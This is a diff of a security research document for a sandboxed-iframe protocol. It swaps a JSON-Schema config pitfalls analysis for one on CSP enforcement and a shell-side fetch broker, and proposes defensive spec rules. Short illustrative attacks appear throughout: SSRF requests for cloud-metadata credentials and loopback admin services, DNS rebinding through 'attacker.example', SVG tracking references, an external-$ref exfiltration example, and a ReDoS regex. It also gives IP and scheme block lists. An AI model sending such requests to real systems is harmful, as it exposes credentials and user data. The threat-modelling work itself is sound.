@@ -1,595 +1,626 @@
-# Domain Pitfalls: Adding NUB-CONFIG (Declarative Schema-Driven Config) to a Sandboxed Iframe Protocol
+# Domain Pitfalls: Browser-Enforced Resource Isolation for Sandboxed Napplet Iframes
 
-**Domain:** Per-napplet declarative configuration over postMessage (napplet ↔ shell), schema = JSON Schema draft-07+
-**Researched:** 2026-04-17
-**Overall confidence:** HIGH (grounded in JSON Schema draft-07 specification, documented validator CVEs, the NIP-5D wire model, existing NUB modular architecture, and the `feedback_nub_scope_boundary` / `feedback_no_implementations` / `feedback_no_private_refs_commits` constraint set)
+**Domain:** Strict CSP enforcement on sandboxed iframes + shell-as-resource-broker for `https:`/`blossom:`/`nostr:`/`data:` URLs over postMessage
+**Researched:** 2026-04-20
+**Overall confidence:** HIGH (grounded in W3C CSP3, MDN, Chromium/Firefox bug trackers, recent CVE disclosures, Simon Willison's April 2026 sandbox-escape research, JSON envelope wire format already shipped in v0.16.0+, and existing NUB modular architecture per `feedback_nub_scope_boundary` / `feedback_no_implementations` / `feedback_no_private_refs_commits`)
 
 ---
 
-## Orientation: What NUB-CONFIG Is — and What It Is NOT
+## Orientation: What v0.28.0 Adds — and the Scope Discipline It Requires
 
-NUB-CONFIG is a **protocol surface**. It defines:
+This milestone introduces **two new things** layered on top of the existing JSON-envelope postMessage protocol:
 
-- Wire messages (`config.registerSchema`, `config.get`, `config.subscribe`, `config.values`, `config.openSettings`)
-- A schema contract (JSON Schema draft-07+, plus `x-napplet-*` extension keys)
-- MUST/SHOULD/MAY guarantees that shells promise to napplet authors
-- Potentialities (`$version`, `x-napplet-secret`, `x-napplet-section`, `x-napplet-order`) that shells MAY act on
+1. **Browser-enforced isolation.** A strict CSP (`connect-src 'none'` minimum, plus shell-controlled additions) makes "the napplet cannot fetch directly" a fact, not a convention.
+2. **A scheme-pluggable resource primitive.** `resource.bytes(url) → blob` is the single napplet-side API; URL handlers (`https:`, `blossom:`, `nostr:`, `data:`) are pluggable on the shell side. Hashes stay shell-internal; napplets address by URL.
 
-NUB-CONFIG does NOT dictate:
+A new NUB (`resource`) defines the wire surface. NIP-5D gets a Security Considerations amendment for strict-CSP. NUB-RELAY gets an optional sidecar field on `relay.event`. NUB-IDENTITY + NUB-MEDIA get clarifications. The vite-plugin emits CSP-aware HTML in dev. Audio/video are explicitly out of scope.
 
-- Which validator library the shell uses
-- Which UI paradigm the shell renders (native prefs window, modal, in-chrome drawer, CLI…)
-- Migration UX (clamp, drop, ask-user, cold-start…)
-- Secret storage backend (OS keychain, encrypted localStorage, in-memory only…)
+Per `feedback_nub_scope_boundary`: **every pitfall is classified as either**
+- **SPEC concern** — must be addressed in the NUB-RESOURCE wire contract or the NIP-5D §Security amendment as MUST/SHOULD/MAY, OR
+- **IMPL concern** — belongs in the private `@napplet/*` reference implementation (shim, sdk, vite-plugin) and MUST NOT inflate the public spec's MUST-level surface, OR
+- **DOCS concern** — belongs in shell-author guidance (READMEs, skills/) and MUST NOT appear in the public spec at all.
 
-Per `feedback_nub_scope_boundary`: every pitfall below is classified as either a **SPEC concern** (must appear in the NUB-CONFIG wire contract as MUST/SHOULD/MAY) or a **SHELL concern** (belongs in shell implementation docs and MUST NOT inflate NUB-CONFIG's MUST-level). This classification is the single most important output of this research — it tells the requirements phase which items become "MUST NOT" spec items and which get noted for downstream shell authors.
+Per `feedback_no_implementations` and `feedback_no_private_refs_commits`: the public NUB spec MUST NOT mention `@napplet/*`. Any cross-repo coordination pitfall is called out explicitly.
+
+Per the project's "no backwards compatibility" stance: pitfalls that ASSUME backcompat (deprecation banners, fallback API paths) are explicitly flagged.
 
 ---
 
 ## Severity Legend
 
-- **HIGH** — would break users (data loss, inescapable UX), exposes security vulnerability, or makes the spec unimplementable
-- **MEDIUM** — produces inconsistent implementations across shells, causes ergonomic pain for napplet authors, or creates silent footguns
-- **LOW** — cosmetic, recoverable, or rare-path
+- **PROJECT-KILLER** — would break the security model entirely (browser doesn't actually enforce what we claim), produce silent data exfil, or make the spec unimplementable. Must be addressed before v0.28.0 ships.
+- **SERIOUS** — produces inconsistent behavior across shells, exposes attackable surface, or causes subtle protocol drift. Should be addressed in the appropriate phase.
+- **ANNOYANCE** — costs developer time, generates support questions, or causes minor UX regressions. Should be documented; can be deferred.
 
 ## Phase Legend (maps to target milestone roadmap)
 
-- **SPEC** — NUB-CONFIG spec draft (napplet/nubs#13, public repo)
-- **PACKAGE** — `nub-config` package scaffolding: types, shim installer, SDK wrappers (private @napplet repo)
-- **INTEGRATION** — core dispatch, shim/SDK plumbing, vite-plugin manifest injection (private @napplet repo)
-- **DOCS** — napplet repo READMEs, CLAUDE.md updates, NIP-5D table row
+- **SPEC** — NIP-5D §Security amendment + new NUB-RESOURCE spec + NUB-RELAY/IDENTITY/MEDIA amendments (all in PUBLIC `napplet/nubs` repo)
+- **IMPL** — `@napplet/nub/resource` + shim/sdk plumbing + `@napplet/vite-plugin` CSP emission (PRIVATE `napplet` repo)
+- **VERIFY** — Playwright/Vitest tests proving CSP actually blocks, sidecar correctness, scheme dispatch
+- **DOCS** — package READMEs, skills updates, shell-author resource-policy guidance
 
 ---
 
-## Critical Pitfalls (HIGH severity)
+## Critical Pitfalls (PROJECT-KILLER severity)
 
-### Pitfall 1: JSON Schema Feature Scope Creep → Napplets Use Features Shells Can't Render
+### Pitfall 1: Meta CSP Placed After a `<script>` Tag → Policy Doesn't Apply
 
-**What goes wrong:** JSON Schema draft-07 is a huge surface: `oneOf`, `allOf`, `anyOf`, `not`, `$ref`, `if`/`then`/`else`, `dependencies`, `patternProperties`, tuple-typed arrays (`items: [schemaA, schemaB]`), negative schemas, format validators, `propertyNames`, etc. A napplet declares `oneOf: [{ type: "string" }, { type: "object", properties: { ... } }]`. Shell A (simple form renderer) shows nothing — it can't render a union. Shell B falls through silently and persists unvalidated data. Shell C throws at registerSchema time. Three shells, three behaviors. Napplet author has no idea which subset is safe.
+**What goes wrong:** Vite's HTML transform pipeline injects scripts (HMR client, module preload polyfill, dev-mode `import.meta` shims) into `<head>`. If the CSP `<meta http-equiv>` ends up AFTER any of those scripts, the browser parses-and-executes the early scripts WITHOUT the policy in force. Worse, modules loaded before the meta tag may already have called `fetch()` to network endpoints. The shell believes isolation is enforced; the browser disagrees.
 
-**Why it happens:** "Use JSON Schema" is a one-line decision. "Use this subset of JSON Schema" is a 200-line spec. It is tempting to punt to "whatever draft-07 says" without carving a renderable subset.
+**Why it happens:** `<meta http-equiv="Content-Security-Policy">` only applies to elements parsed AFTER it ([csplite test240](https://csplite.com/csp/test240/)). Vite injects content via `transformIndexHtml` hooks; plugin order matters. Default plugin behavior pushes the CSP meta wherever the developer placed it in `index.html`, but Vite's own injections (HMR client) typically land at the top of `<head>` regardless.
 
-**Scope classification:** **SPEC concern** — the wire contract must define the minimum subset shells MUST support and the maximum subset napplets SHOULD NOT exceed.
+**Severity:** PROJECT-KILLER. The whole point of this milestone is browser-enforced isolation; if the policy doesn't bind, nothing else matters.
 
 **Prevention (concrete, actionable):**
-- NUB-CONFIG MUST define a **Core Subset** that every conformant shell MUST render and validate:
-  - Top-level `type: "object"` with `properties`
-  - Primitive types: `string`, `number`, `integer`, `boolean`
-  - Array of primitives (homogeneous, NOT tuple-typed)
-  - Nested objects (bounded depth — see Pitfall 2)
-  - Constraints: `minimum`, `maximum`, `minLength`, `maxLength`, `enum`, `minItems`, `maxItems`, `pattern` (with caveats — see Pitfall 4)
-  - `default`, `description`, `title`
-  - `required` (array form)
-  - `x-napplet-*` extension keys (treated as opaque metadata by shells that don't understand them)
-- NUB-CONFIG SHOULD define an **Extended Subset** that shells MAY support: `oneOf` with a discriminator, `anyOf` with a discriminator, `format` as hints only, `if`/`then`/`else`
-- NUB-CONFIG MUST forbid at wire level: `$ref` to external URIs, `$ref` outside the same schema document, tuple-typed arrays (`items: []`), `not`, recursive `$ref` without a depth bound
-- Napplet queries capability: `window.napplet.shell.supports('nub:config:extended')` — if false, authoring tool (vite-plugin) should warn when schema uses extended features
-- Vite-plugin SHOULD statically analyze the declared schema at build time and warn on non-Core features so napplet authors catch this BEFORE runtime
+- Vite-plugin MUST inject the CSP `<meta>` as the **first child of `<head>`** with hook ordering `enforce: 'pre'` and a custom `transformIndexHtml` order that runs before Vite's HMR client injection.
+- Vite-plugin MUST include a build-time assertion: parse the emitted HTML, walk `<head>`, fail if any `<script>`, `<style>`, or `<link>` element appears before the CSP meta.
+- Reference shim MUST treat the policy as advisory in dev (since dev needs HMR exceptions) but MUST emit a console warning when `script-src` includes `'unsafe-inline'` or `'unsafe-eval'` so devs notice if dev-mode laxity leaks to prod.
+- The NIP-5D §Security amendment SHOULD note: "When CSP is delivered via `<meta>`, the meta element MUST be the first parsed element in `<head>` to ensure policy applies to all subsequent resource loads."
 
-**Phase:** SPEC (define subset boundaries), PACKAGE (vite-plugin static analyzer)
+**Phase:** SPEC (note in §Security), IMPL (vite-plugin head ordering + assertion), VERIFY (Playwright test that loads a napplet, walks DOM, asserts meta-first)
 
-**Confidence:** HIGH — the additionalProperties default-true behavior and $ref runtime-resolution risk are both documented JSON Schema pitfalls per official docs.
+**Confidence:** HIGH — directly documented behavior across MDN and CSP test suites.
 
 ---
 
-### Pitfall 2: Unbounded Schema Nesting / Recursive `$ref` → Stack Overflow or Render Hang
+### Pitfall 2: Header-Only CSP Directives Used in Meta Tag → Silently Ignored
 
-**What goes wrong:** A napplet declares a self-referential schema (e.g. a tree editor with `children: { type: "array", items: { $ref: "#" } }`). Shell's renderer recurses forever or blows the stack. Alternatively: a napplet declares 20-levels-deep nested objects "just because." Shell renders 20 nested collapsible panels — technically works, UX is dead.
+**What goes wrong:** A spec author or reference implementer writes `<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self'; sandbox allow-scripts; report-uri /csp-report">`. The browser silently ignores `frame-ancestors`, `sandbox`, and `report-uri` because the [W3C CSP3 spec](https://www.w3.org/TR/CSP3/) restricts those directives to HTTP headers only. The `connect-src 'none'` part still works; the protection the author thought they had on `frame-ancestors` doesn't exist. Tests pass (because `connect-src` is enforced); production has a clickjacking gap.
 
-**Why it happens:** JSON Schema has no built-in depth limit. Draft-07 allows `$ref: "#"` (self-reference). Validators handle it fine with cycle detection, but UI renderers don't automatically have cycle detection.
+**Why it happens:** The directive list looks uniform from a CSP author's perspective. The header-vs-meta restriction is a CSP3 detail buried in the spec.
 
-**Scope classification:** **SPEC concern** (the schema wire contract must carry a max-depth bound) + **SHELL concern** (enforcement mechanism).
+**Severity:** PROJECT-KILLER for any directive that's meant to provide isolation. SERIOUS for `report-uri` (you just lose telemetry).
 
 **Prevention:**
-- NUB-CONFIG MUST specify a maximum nesting depth (recommend: 4 levels) for the Core Subset
-- NUB-CONFIG MUST forbid recursive `$ref` (any self-reference, direct or indirect) in the wire contract
-- Shell MUST reject schemas exceeding the depth limit at `config.registerSchema` time with a structured error (`{ type: "config.registerSchema.error", code: "schema-too-deep", limit: 4 }`)
-- Vite-plugin SHOULD validate depth at build time and refuse to emit the manifest
+- Vite-plugin MUST validate the configured directive set at build time: reject `frame-ancestors`, `sandbox`, `report-uri`, `report-to` if delivery is meta-only with a clear error pointing the developer at header-based delivery.
+- NIP-5D §Security amendment MUST enumerate which directives are header-only and recommend a delivery mechanism (HTTP header preferred when shell hosts napplet HTML; meta acceptable when napplet is served from blob/srcdoc).
+- Reference shim's resource-broker SHOULD set the iframe's `csp` attribute (the Embedded Enforcement spec) AND set the iframe's `sandbox` attribute (HTML-level, not CSP-level) — these are the runtime enforcement surfaces, NOT the meta CSP.
+- Skill docs MUST document the meta-vs-header table clearly so shell authors don't trip on it.
 
-**Phase:** SPEC (declare depth limit + `$ref` rules), PACKAGE (vite-plugin enforcer)
+**Phase:** SPEC (enumerate header-only directives), IMPL (vite-plugin validator), DOCS (clear table in SKILL)
 
-**Confidence:** HIGH
+**Confidence:** HIGH — W3C CSP3 §4.2 + MDN.
 
 ---
 
-### Pitfall 3: `$ref` Resolution — Network / Cross-Napplet / Filesystem
+### Pitfall 3: srcdoc Iframe Inherits Parent CSP — Restriction Cannot Be Loosened
 
-**What goes wrong:** A napplet declares `{ $ref: "https://evil.example/schema.json" }`. The shell's validator fetches that URL at registerSchema time (or at every validate call). This is:
-1. A data exfiltration channel (the request URL itself can carry stolen values)
-2. A denial-of-service vector (slow/hanging URLs block validation)
-3. A TOCTOU surface (schema changes between validations)
-4. A privacy leak (every validation reveals which napplet is installed + values to the remote server)
+**What goes wrong:** A shell author serves napplet HTML via `<iframe srcdoc="...">` (a tempting alternative to spinning up blob URLs). Per the [W3C webappsec issue #700](https://github.com/w3c/webappsec-csp/issues/700) "wontfix" resolution, the srcdoc iframe **inherits the parent page's CSP**, and there is no way for the napplet to override it. If the shell page has `script-src 'self'`, the napplet can't load its bundled scripts. If the shell page has lax CSP, the napplet inherits the laxity (security regression). Conversely, [Mozilla bug 1073952 (CVE-2017-7788)](https://bugzilla.mozilla.org/show_bug.cgi?id=1073952) is a historical precedent for srcdoc + sandbox CSP bypass.
 
-Even same-document `$ref: "#/definitions/foo"` is fine, but `$ref: "../other-napplet-schema.json"` or `$ref: "file:///etc/passwd"` is not.
+**Why it happens:** srcdoc iframes share the parent's browsing context for some policy decisions, and the WHATWG considers loosening this an anti-feature.
 
-**Why it happens:** Default validator behavior in many JSON Schema libraries is to auto-resolve `$ref`. Python `jsonschema` and others have documented this as a security concern when schemas are untrusted — which napplet-provided schemas always are.
-
-**Scope classification:** **SPEC concern** (wire contract must forbid).
+**Severity:** PROJECT-KILLER for shells that adopt srcdoc as the default delivery mechanism. SERIOUS for shells that serve napplets from blob URLs or http(s) endpoints (those are unaffected).
 
 **Prevention:**
-- NUB-CONFIG MUST forbid `$ref` with any scheme (`http://`, `https://`, `file://`, or scheme-less paths)
-- NUB-CONFIG MAY allow `$ref` to the same document's `#/definitions/*` or `#/$defs/*` pointer only
-- Shell MUST reject any schema with non-local `$ref` at registerSchema time
-- Vite-plugin MUST reject at build time
+- NIP-5D §Security amendment SHOULD note: "Shells delivering napplet HTML via `srcdoc` inherit the parent document's CSP and cannot impose a stricter policy on the napplet via meta CSP. Shells SHOULD deliver napplet HTML via a separate origin (blob URL, http(s) URL, or data: URL with appropriate sandboxing) when CSP isolation is required."
+- NUB-RESOURCE spec MUST NOT mandate a delivery mechanism — that's a shell concern.
+- Reference shim MUST use blob URLs (or whatever the shell registry chooses) for napplet HTML, never srcdoc; document the rationale.
+- Reference shim MUST NOT assume the parent shell page has any particular CSP — derive the napplet's effective policy from the iframe-level controls only.
 
-**Phase:** SPEC (forbid external refs), PACKAGE (vite-plugin + shim-side validator), INTEGRATION (shell-side validator in reference shim)
+**Phase:** SPEC (non-normative note), IMPL (shim chooses non-srcdoc delivery), DOCS (rationale in skill)
 
-**Confidence:** HIGH — this matches the JSON Schema official guidance to bundle refs at build time rather than resolve at runtime.
+**Confidence:** HIGH — multiple W3C bug threads + WHATWG wontfix.
 
 ---
 
-### Pitfall 4: `pattern` Regex → ReDoS (Regular Expression Denial of Service)
+### Pitfall 4: blob: URL Worker Bootstrap Inherits Creator's CSP — Sandbox Escape Path
 
-**What goes wrong:** A napplet declares `pattern: "^(a|a)*$"` (or similar catastrophic-backtracking regex) on a string field. The shell's form validates on every keystroke. User types "aaaaaaaaaaaaaaaaaaaaaaaaaaa" — the JS RegExp engine spends 44+ seconds in a single validation call, hanging the shell. Confirmed CVE territory: CVE-2025-69873 (ajv validator) demonstrates exactly this pattern — a 31-character payload causes ~44s of CPU blocking, doubling with each added character.
+**What goes wrong:** Per [MDN CSP docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy), if a worker's URL scheme is `data:` or `blob:`, the worker **inherits the CSP of the document or worker that created it**. Iframes from blob URLs typically don't inherit, but workers do. A napplet creates a Worker from a blob URL the napplet generated from inline JS; the worker inherits the napplet's CSP (which is `connect-src 'none'`); fine so far. But if a napplet can be tricked into creating a worker from a blob the napplet didn't generate (or the vite-plugin emits a worker bootstrap that the napplet doesn't expect), the worker inherits a CSP that may be lax in dev mode and ship the laxity to prod.
 
-**Why it happens:** JSON Schema `pattern` uses ECMA-262 regex syntax. The JavaScript `RegExp` engine is backtracking-based and has exponential worst-case performance. Validators that pass `pattern` strings directly to `new RegExp()` inherit the vulnerability.
+A second variant: napplets can create blob URLs to load images or audio (legitimate). The CSP needs `img-src blob:` and `media-src blob:` for those to work. Forgetting this means napplet-generated blob images break with no diagnostic except a console error.
 
-**Scope classification:** **SPEC concern** (must warn + require protection) + **SHELL concern** (pick a linear-time regex engine).
+**Severity:** PROJECT-KILLER if the worker-CSP-inheritance interacts with shell-mediated sidecar resources delivered as blob URLs. SERIOUS otherwise.
 
 **Prevention:**
-- NUB-CONFIG MUST require that shells validate `pattern` in a way that cannot hang the UI thread. Concrete guidance (SHOULD): run validation off the main thread (Web Worker) with a hard timeout, OR use a linear-time regex engine (e.g. RE2-WASM), OR disable `pattern` entirely in the Core Subset and treat it as Extended
-- NUB-CONFIG MUST define a max pattern length (recommend: 512 chars) in the wire contract
-- NUB-CONFIG MUST define a validation-call budget (recommend: 50ms per validate) after which the shell MUST treat the input as invalid
-- The spec SHOULD explicitly name ReDoS as a risk so implementers don't have to discover it
-- Vite-plugin MAY run declared patterns through a static analyzer (e.g. `safe-regex`) at build time and warn
+- NUB-RESOURCE spec MUST clarify: `resource.bytes(url)` returns a Blob. The shell creates the Blob; the napplet receives it via structured-clone over postMessage. The napplet calls `URL.createObjectURL(blob)` to get a blob: URL it can use locally.
+- NIP-5D §Security amendment MUST enumerate the minimum CSP additions required for blob:-resource delivery: `img-src blob: data:`, `media-src blob:` (deferred to v.next per audio/video out-of-scope), `font-src blob: data:`. `worker-src` SHOULD be `'none'` unless the napplet declares a need.
+- Reference shim's vite-plugin MUST emit the right defaults; expose a configuration knob for napplets that need worker-src.
+- Reference shim MUST forbid the napplet from creating workers in the default policy (sets `worker-src 'none'`). Napplets requiring workers must opt in via manifest, and the shell decides whether to grant.
+- Tests MUST include a CSP-blocked-worker assertion.
 
-**Phase:** SPEC (name the risk + budget), PACKAGE (build-time static analyzer), INTEGRATION (reference shim uses linear-time engine or Worker timeout)
+**Phase:** SPEC (NUB-RESOURCE blob delivery contract + NIP-5D CSP minimums), IMPL (vite-plugin defaults), VERIFY (Playwright worker-creation-blocked test)
 
-**Confidence:** HIGH — CVE-2025-69873 is a documented real-world ReDoS in a popular JSON Schema validator.
+**Confidence:** HIGH — directly documented in MDN.
 
 ---
 
-### Pitfall 5: `additionalProperties` Default True → Silent Data Accretion
+### Pitfall 5: Service Worker Bypasses Iframe Sandbox / CSP — but Only When `allow-same-origin`
 
-**What goes wrong:** JSON Schema default for `additionalProperties` is `true`. A napplet declares `{ properties: { apiKey: {...} } }`. A malicious or buggy napplet also sends `registerSchema` with an extra `{ properties: { apiKey: {...}, adminSecret: {...} } }` later — the shell's persisted store silently grows with `adminSecret` alongside user's `apiKey`. Or: legitimate napplet version 1 had `apiKey`, version 2 removes it. Shell's store still has `apiKey` (orphaned property) which now lacks a schema to validate against.
+**What goes wrong:** Per [Chromium issue 486308](https://bugs.chromium.org/p/chromium/issues/detail?id=486308) and [w3c/ServiceWorker issue 1390](https://github.com/w3c/ServiceWorker/issues/1390), if a sandboxed iframe has `allow-same-origin`, a service worker registered by the parent origin can intercept the iframe's requests, **bypassing what the developer thought was sandbox isolation**. Without `allow-same-origin` (which napplets DON'T have per NIP-5D), the service worker cannot intercept — but a future shell author who accidentally adds `allow-same-origin` (e.g. "to make storage work") opens the bypass.
 
-**Why it happens:** JSON Schema's default was chosen for forward compatibility in general-purpose data validation. It is the **wrong** default for a stored, persisted, user-facing settings schema.
+A second variant: the shell page itself runs a service worker (e.g. for offline support of the shell UI). If the napplet is served from the same origin as the shell, the service worker sees the napplet's resource fetches and could rewrite them — meaning shell-controlled CSP is no longer the source of truth for what the napplet actually loads.
 
-**Scope classification:** **SPEC concern** (the wire contract must override the JSON Schema default for NUB-CONFIG's purpose).
+**Severity:** PROJECT-KILLER if the shell ever adds `allow-same-origin` or serves napplets from the shell's own origin and runs a service worker.
 
 **Prevention:**
-- NUB-CONFIG MUST specify `additionalProperties: false` as the default for the top-level object when the napplet does not specify it explicitly. (Override the JSON Schema draft-07 default for NUB-CONFIG's scope.)
-- NUB-CONFIG MUST specify that the shell drops (does not persist, does not deliver to napplet) any property in the stored store that is not in the current declared schema
-- NUB-CONFIG SHOULD recommend shells retain unknown-property values in a "graveyard" scoped to `(dTag, aggregateHash)` for one session after schema change, in case the schema change is a bug the napplet author rolls back — but MUST not deliver them
-- Napplets SHOULD always declare `additionalProperties: false` explicitly to be robust across shell implementations
+- NIP-5D §Transport ALREADY mandates `sandbox="allow-scripts"` only — this milestone MUST reaffirm and ADD: "Shells MUST NOT add `allow-same-origin` to napplet iframe sandbox attributes. The combination of `allow-scripts` + `allow-same-origin` is a documented browser-level escape path because it allows service workers registered by the shell origin to intercept napplet resource loads."
+- NIP-5D §Security amendment MUST add: "Shells SHOULD serve napplet HTML from an origin distinct from the shell origin (e.g. blob URL, separate subdomain) to ensure shell-side service workers cannot intercept napplet fetches."
+- Reference shim MUST assert at iframe-creation time that `allow-same-origin` is not present in the sandbox attribute (defensive throw).
+- Test suite MUST include a positive assertion: create a service worker on the shell origin that intercepts `*`, load a napplet, verify the napplet's `resource.bytes()` call goes to the shell broker (postMessage path) and NOT through the service worker.
 
-**Phase:** SPEC (override the default), INTEGRATION (reference shim drops unknown props)
+**Phase:** SPEC (reaffirm + add origin-separation guidance), IMPL (defensive throw), VERIFY (service-worker non-interception test)
 
-**Confidence:** HIGH — JSON Schema `additionalProperties` default is documented.
+**Confidence:** HIGH — Chromium and WHATWG bugs both confirm the asymmetry.
 
 ---
 
-### Pitfall 6: Napplet Spoofs Another Napplet's Config via registerSchema
+### Pitfall 6: SSRF via Cloud Metadata / Private IPs / Loopback — Shell as Confused Deputy
 
-**What goes wrong:** Napplet A is a password manager; it registers a schema with an `x-napplet-secret: true` field for master password. Napplet B (malicious) sends `config.registerSchema` with what appears to be Napplet A's schema shape, hoping to read A's persisted secret.
+**What goes wrong:** A napplet calls `resource.bytes("https://169.254.169.254/latest/meta-data/iam/security-credentials/")`. The shell's default policy (Node.js `fetch`, browser `fetch` from a privileged context, or Tauri/Electron environment) follows the URL and returns AWS IAM credentials to the napplet. Or `resource.bytes("http://localhost:8080/admin")` returns the shell user's local admin panel content. Or `resource.bytes("http://127.0.0.1:11434/api/tags")` returns the user's local Ollama models. Or `resource.bytes("file:///etc/passwd")` if the shell environment supports `file://`.
 
-**Why it happens:** Without source-identity enforcement, the shell would treat registerSchema as trust-no-one. But NIP-5D already establishes that the shell identifies senders via unforgeable `MessageEvent.source` at iframe creation — so this attack is blocked at the transport layer, NOT at NUB-CONFIG level. Still, the spec must explicitly call this out so implementers don't regress.
+A second variant: **DNS rebinding** ([Yunus Aydın 2026 SSRF blog](https://aydinnyunus.github.io/2026/03/14/ssrf-dns-rebinding-vulnerability/), [Behrad Taher's writeup](https://behradtaher.dev/DNS-Rebinding-Attacks-Against-SSRF-Protections/)). Napplet asks for `https://attacker.example/payload`. Shell resolves DNS — gets a public IP — passes the URL to fetch. By the time the actual HTTP request is made (or a redirect is followed), the DNS TTL has expired and the next resolution returns 169.254.169.254. The shell's "we already validated this URL" guard is bypassed.
 
-**Scope classification:** **SPEC concern** (reaffirm the NIP-5D source-identity guarantee in the NUB-CONFIG security considerations section).
+A third variant: **redirect amplification**. Napplet asks for a "harmless" URL; shell follows redirects (default behavior of `fetch`); final URL ends up at `http://localhost:6379/` and the shell returns the Redis introspection bytes.
+
+**Severity:** PROJECT-KILLER. This is the #1 attack surface for the shell-as-broker model. The project explicitly accepts shell-as-fetch-proxy as irreducible, but the *bounded by policy defaults* requirement means the defaults MUST be safe.
 
 **Prevention:**
-- NUB-CONFIG Security Considerations section MUST state: "Storage is scoped by `(dTag, aggregateHash)` derived from the iframe's MessageEvent.source per NIP-5D §{X}. A napplet cannot register a schema or read values outside its own scope."
-- NUB-CONFIG MUST forbid any wire message that carries a `dTag` or `aggregateHash` argument from the napplet side (prevents "I'm actually napplet-X" injection)
-- The spec MUST explicitly reference NIP-5D as the parent spec
+- NUB-RESOURCE spec MUST require: "Shells implementing the `https:` scheme handler MUST, by default, reject URLs whose resolved IP is in any of the following ranges: RFC1918 private ranges (10/8, 172.16/12, 192.168/16), loopback (127/8, ::1/128), link-local (169.254/16, fe80::/10), broadcast (255.255.255.255), unspecified (0.0.0.0, ::), CGNAT (100.64/10), site-local (fec0::/10). Shells MAY allow additional addresses behind explicit shell-administrator policy (e.g. enterprise on-prem services), but the default for community-deployed shells MUST be restrictive."
+- NUB-RESOURCE spec MUST require: "Shells MUST resolve DNS and bind the connection to the resolved IP before issuing the HTTP request (DNS pinning), preventing TOCTOU/rebinding bypass. Each redirect MUST be re-validated against the IP block list before being followed."
+- NUB-RESOURCE spec MUST require: "Shells MUST NOT support `file://`, `gopher://`, `dict://`, or other smuggling-prone schemes in the default `https:` handler. The scheme dispatcher MUST whitelist schemes, not blacklist."
+- NUB-RESOURCE spec MUST require: "Shells MUST cap the redirect chain (recommend: 5) and MUST treat each redirect as a fresh policy check."
+- NUB-RESOURCE spec MUST require: "Shells SHOULD enforce a per-napplet rate limit on `resource.bytes` calls (recommend: 60/minute default) and a global concurrency cap."
+- The reference shim MUST ship with these defaults and MUST surface a `denied: 'private-ip' | 'rate-limited' | 'scheme-not-supported' | 'redirect-loop' | 'mime-blocked'` error envelope.
+- Skill docs MUST include a "shell deployer's resource policy checklist" enumerating these defaults and the rationale for each.
 
-**Phase:** SPEC (security section + parent spec reference), INTEGRATION (reference shim derives scope from source only)
+**Phase:** SPEC (NUB-RESOURCE Security MUST list), IMPL (reference shim defaults), VERIFY (Playwright tests for each blocked range), DOCS (shell deployer checklist)
 
-**Confidence:** HIGH — this is how the existing NUB family already works.
+**Confidence:** HIGH — well-documented attack class with clear mitigations.
 
 ---
 
-### Pitfall 7: Napplet Attempts to Mutate Config Directly Over the Wire
+### Pitfall 7: SVG with `<foreignObject>` or External References → HTML/Script Injection
 
-**What goes wrong:** A convenience-minded contributor adds `config.set({ key: "apiKey", value: "..." })` because "it's obvious, users will want it." Now the shell-sole-writer invariant is broken: napplet can write its own config bypassing any shell UI, consent, or validation-at-write checks.
+**What goes wrong:** A napplet calls `resource.bytes("https://example/malicious.svg")`. The shell fetches it, returns the bytes, the napplet creates a blob URL, drops it into an `<img src="blob:...">`. SVG in `<img>` is mostly script-safe, but per [Fortinet SVG attack surface analysis](https://www.fortinet.com/blog/threat-research/scalable-vector-graphics-attack-surface-anatomy) and [Mozilla CVE-2022-28284](https://bugzilla.mozilla.org/show_bug.cgi?id=1754522), `<foreignObject>` enables XHTML embedding inside SVG. Some browsers historically have parsed scripts inside foreignObject when the SVG is loaded via `<object>`, `<iframe>`, or directly as a top-level document.
 
-**Why it happens:** "Of course you can write to your own config" is a seductive default. But the napplet model says: shell owns the UX, napplet is untrusted code. If napplet can write, then any compromise of the napplet silently corrupts user settings without any shell chrome showing a change occurred.
+The "shell-side SVG rasterization" feature in this milestone is exactly the right mitigation, but the rasterizer itself has attack surface:
+- An SVG can `<image href="https://attacker.example/track">` — the rasterizer fetches the URL, leaking the user's IP and timing to the attacker.
+- An SVG can reference fonts (`@font-face` with src URL) — same leak.
+- An SVG can recursively `<use>` itself ([SVG `<use>` recursion DoS, common attack pattern](https://www.fortinet.com/blog/threat-research/scalable-vector-graphics-attack-surface-anatomy)).
+- An SVG can embed XML entities in DOCTYPE → [billion laughs (CVE-2026-29074 in svgo)](https://github.com/advisories/GHSA-xpqw-6gx7-v673), 811 bytes → multi-GB heap.
 
-**Scope classification:** **SPEC concern** (the wire contract must MUST NOT define any napplet→shell write message).
+**Severity:** PROJECT-KILLER for shells that rasterize untrusted SVG without filtering. SERIOUS for shells that pass SVG bytes through unmodified (the napplet's CSP partially mitigates by blocking `connect-src`, but SVG-internal references can still be made by the browser's image loader).
 
 **Prevention:**
-- NUB-CONFIG wire messages napplet→shell MUST be limited to: `config.registerSchema` (schema declaration), `config.get` (one-shot read), `config.subscribe`/`config.unsubscribe` (live read), `config.openSettings` (request UI)
-- NUB-CONFIG wire messages shell→napplet MUST be limited to: `config.values` (initial snapshot + push updates)
-- The spec MUST explicitly state under MUST-level guarantees: "The napplet MUST NOT have any wire message that mutates persisted config values. Shell UI is the sole writer."
-- If a future extension wants napplet-initiated mutation (e.g. "reset to defaults"), it MUST be gated by shell-rendered user confirmation and defined as a separate capability, NOT added to NUB-CONFIG's base surface
+- NUB-RESOURCE spec MUST specify: "When the shell's MIME classifier identifies a fetched resource as `image/svg+xml`, the shell MUST either (a) rasterize it to a bitmap format (PNG/WebP) before delivering, OR (b) sanitize the SVG to remove `<foreignObject>`, `<script>`, `<style>` tags, external references in `xlink:href` / `href` / `style` URL functions, XML DOCTYPE entities, and `<use>` recursion, OR (c) refuse to deliver the resource. The default for community-deployed shells SHOULD be (a) rasterization."
+- NUB-RESOURCE spec MUST specify: "Rasterizers MUST run in an isolated context (Worker or sandboxed iframe with no network) so that any SVG-internal external reference attempt is blocked at the rasterizer level. The rasterizer MUST NOT make any network request."
+- NUB-RESOURCE spec MUST specify: "Rasterizers MUST cap output dimensions (recommend: 4096×4096 pixels), input bytes (recommend: 5MB), and rasterization wall-clock time (recommend: 2s). Exceeding any cap MUST result in a `denied: 'svg-bomb' | 'svg-too-large' | 'svg-timeout'` error envelope."
+- Reference shim MUST use a sanitizing library (e.g. DOMPurify with SVG profile) AND rasterize via canvas in a Worker; document the choice.
